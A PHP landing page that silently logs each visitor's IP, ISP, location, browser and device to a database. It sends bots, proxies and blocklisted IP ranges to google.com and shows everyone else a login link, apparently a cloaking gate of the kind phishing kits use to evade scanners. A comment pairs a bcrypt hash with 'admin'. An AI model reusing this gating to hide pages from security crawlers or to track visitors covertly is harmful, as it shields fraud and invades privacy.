<?php
session_start();
require_once './config/config.php';
require_once './helpers/helpers.php';

$username = "";
$passwd = "";

if("$_SERVER[REQUEST_URI]" != "/visit.php")
{
    print_r("$_SERVER[REQUEST_URI]");
    header('Location: https://www.google.com/');
}


$_SESSION['begin_time'] = new DateTime();
$_SESSION['current_id'] = -1;
//echo password_verify('admin', '$2y$10$RnDwpen5c8.gtZLaxHEHDOKWY77t/20A4RRkWBsjlPuu7Wmy0HyBu'); exit;
// if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    //Get DB instance.
    $db = getDbInstance();
    $ip = getIPAddress();  
    $db->where('ip_addr',$ip)->get('users');
    $count = $db->count;

    //$country = getIPInfo($ip);
    $isp = getISP($ip);
    $browser = getBrowser();
    $os = getOS();
    //$region = getIPInfo($ip,'region');
    //$zipcode = getZipcode(getIPInfo($ip, 'address'));
    $info = getIPAPI($ip);
    if(checkBlockedGuest($ip) || checkBlockedIP() || checkBlockedCIDR() || isBot())
    {
        $blocked_bot = array(
            'user_name'=> $username,
            'ip_addr' => $ip,
            'country' => $info['country'],
            'isp' => $isp,
            'browser' => $browser,
            'os_name' => $os,
            'visited_page' => "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]",
            'blocked' => 1,
            'country_code' => strtolower($info['countryCode']),
            'city' => $info['city'],
            'region' => $info['region'],
            'zipcode' => $info['zip'],
            'device' => $device,
            'datetime' => date('Y-m-d H:i:s'),
            'is_proxy' => isProxy(),
            'is_bot' => isBot(),
            'user_agent' => $useragent
        );
        $current_id = $db->where('ip_addr',$ip)->update('users', $blocked_bot,);
        header('Location: https://www.google.com/');
        exit();
    }

    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $device = 'Computer';
    if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i',$useragent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($useragent,0,4)))
    {
        $device = 'Mobile';
    }

    $users_array = array(
        'user_name'=> $username,
        'ip_addr' => $ip,
        'country' => $info['country'],
        'isp' => $isp,
        'browser' => $browser,
        'os_name' => $os,
        'visited_page' => "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]",
        'blocked' => 0,
        'country_code' => strtolower($info['countryCode']),
        'city' => $info['city'],
        'region' => $info['region'],
        'zipcode' => $info['zip'],
        'device' => $device,
        'datetime' => date('Y-m-d H:i:s'),
        'is_proxy' => isProxy(),
        'is_bot' => isBot(),
        'user_agent' => $useragent
    );

    if($count == 0)
        $current_id = $db->insert('users', $users_array,);
    else
    {
        $current_id = $db->where('ip_addr',$ip)->update('users', $users_array,);
    }
    $_SESSION['current_id'] = $current_id;
// }
//setInterval('doit', 10);
doit();
function isProxy(){
	$test_HTTP_proxy_headers = array(
		'HTTP_VIA',
		'VIA',
		'Proxy-Connection',
		'HTTP_X_FORWARDED_FOR',  
		'HTTP_FORWARDED_FOR',
		'HTTP_X_FORWARDED',
		'HTTP_FORWARDED',
		'HTTP_CLIENT_IP',
		'HTTP_FORWARDED_FOR_IP',
		'X-PROXY-ID',
		'MT-PROXY-ID',
		'X-TINYPROXY',
		'X_FORWARDED_FOR',
		'FORWARDED_FOR',
		'X_FORWARDED',
		'FORWARDED',
		'CLIENT-IP',
		'CLIENT_IP',
		'PROXY-AGENT',
		'HTTP_X_CLUSTER_CLIENT_IP',
		'FORWARDED_FOR_IP',
		'HTTP_PROXY_CONNECTION');
		
		foreach($test_HTTP_proxy_headers as $header){
			if (isset($_SERVER[$header]) && !empty($_SERVER[$header])) {
				return true;
			}
		}
	return false;
}

function isBot() {

	return (
	  isset($_SERVER['HTTP_USER_AGENT'])
	  && preg_match('/bot|crawl|slurp|spider|mediapartners/i', $_SERVER['HTTP_USER_AGENT'])
	);
  }
include BASE_PATH.'/includes/header.php';
?>
<div id="page-" class="col-md-4 col-md-offset-4">
    <form class="form signupform" method="POST" action="controller/register.php">
        <div class="login-panel panel panel-default">
            <div class="panel-heading">Welcome</div>
            <div class="panel-body">
                <a href="login.php" class="btn btn-primary">Login</a>
            </div>
        </div>
    </form>
</div>
<?php include BASE_PATH.'/includes/footer.php'; ?>